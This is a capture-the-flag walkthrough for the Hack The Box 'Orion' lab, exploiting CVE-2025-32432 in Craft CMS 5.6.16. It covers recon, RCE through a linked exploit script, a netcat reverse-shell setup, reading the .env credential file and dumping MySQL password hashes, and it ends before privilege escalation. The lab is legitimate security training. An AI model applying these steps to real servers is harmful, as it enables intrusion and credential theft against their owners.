z# Hack The Box Labs: Orion

This lab exploits Craft CMS version 5.6.16, the CSV-2025-32432 has a Base Score of 10.0.

https://nvd.nist.gov/vuln/detail/CVE-2025-32432

https://github.com/c0gnit00/CVE-2025-32432



# Recon:

Lets start with an nmap scan:

	nmap 10.129.77.211 -sV -sC 

- Our scan reveals that there are 2 open TCP ports, 22 and 80.

Since weve got a website lets add the ip to the hosts file:

	echo '10.129.77.211 orion.htb' | sudo tee -a /etc/hosts

After clicking through the website we see that its very light, theres a form at the bottom that fails to send a request due to a missing API, and theres no links to other webpages.

This page doesnt seem to provide us with any attack surfaces, so enumerate the website and see what we can find:

NOTE: Be careful when fuzzing, if you overload the server you'll get a "No space left on device" error. If this happens you'll need to reset the machine.

	ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://orion.htb/FUZZ -e .php,.sh,.jpg,.jpeg,.png,.html,.txt,.bak,.js -mc all -fc 404,403

- From from this we've found a few other pages, lets start by going to http://orion.htb/admin

Notice that at the bottom there is a version for a Content Management System (CMS), Craft CMS 5.6.16.



# Exploit:

If we search for Craft CMS 5.6.16 on the web, we can find CVE-2025-32432

Note:

- The exploit involves writing to a log file, some CVEs use a path that will not work for this machine.

- The path /var/lib/php/sessions/sess_<sessionID> was found to work in this instance.


A working exploit script can be found at: https://github.com/c0gnit00/CVE-2025-32432

- Thankfully for us, c0gnit00 modified the exploit specificly for this CTF.

Lets test out the script and try to get remote code execution (RCE):

	./exploit.py -u http://orion.htb/ -c 'id'

As we can see, it returns:

	uid=33(www-data) gid=33(www-data) groups=33(www-data)

Now that we've got RCE, lets get a shell on the server:

- First setup the listener:

		nc -nlp 5555

- Then use the provided shell.sh script to connect to the server:

		./exploit.py -u http://orion.htb/ -c "$(cat shell.sh)"


Now that we've got a shell, lets see what network services are listening for connections:

	ss -ntlp

- Port 22 (ssh)
- Port 23 (Telnet) on 127.0.0.1
- Port 53 (DNS)
- Port 80 (nginx)
- Port 3306 (MySQL) on 127.0.0.1

We can now see new services, Telnet and MySQL, that we didnt see before with our nmap scan because they were not exposed to the outside world. Lets investigate them.

If we try to run the mysql command, we'll be denided because of our username. So lets try to find a password.

First look around in our starting directory, which leads us here:

	cd html/craft/

If we list all files, including the hidden ones, we'll find .env, which this file contains login credentials for mysql.

	cat /var/www/html/craft/.env


We can now use the mysql command. First lets enumerate the databases:

	mysql -u root -p'SuperSecureCraft123Pass!' -e 'show databases;'

Lets see whats in orion:

	mysql -u root -p'SuperSecureCraft123Pass!' -e 'SHOW TABLES FROM orion;'

Theres a users table. Lets access it:

	mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, admin, email, password FROM orion.users;"

Now we've got a hash, lets crack it. 





# Privilege Escalation:











============================================================================



